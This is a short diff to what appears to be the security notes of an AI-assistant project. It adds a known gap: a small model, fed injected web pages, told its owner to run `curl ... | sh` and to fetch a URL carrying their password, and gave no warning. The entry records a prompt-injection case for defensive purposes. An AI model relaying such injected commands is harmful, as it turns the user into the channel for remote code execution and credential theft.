@@ -314,6 +314,12 @@ runs measure behaviour.
 
 ## Known gaps
 
+* **An answer can relay the attack to the owner.** qwen2.5:3b, never
+  fooled into acting, answered "you should run `curl ... | sh`" and "fetch
+  `...validate?d=<your password>`" from the injected pages, without a
+  warning (evals/BASELINES.md, 2026-11-03). The gate covers Jarvis's
+  actions, not advice; the owner becomes the channel. "Making the model
+  say false things" was set aside as accuracy - this is not that.
 * **Marking covers the current request only.** Untrusted text from earlier
   turns returns from history unmarked; the gate still covers it (labels).
 * **The router runs tools directly on some requests with a path or "run"
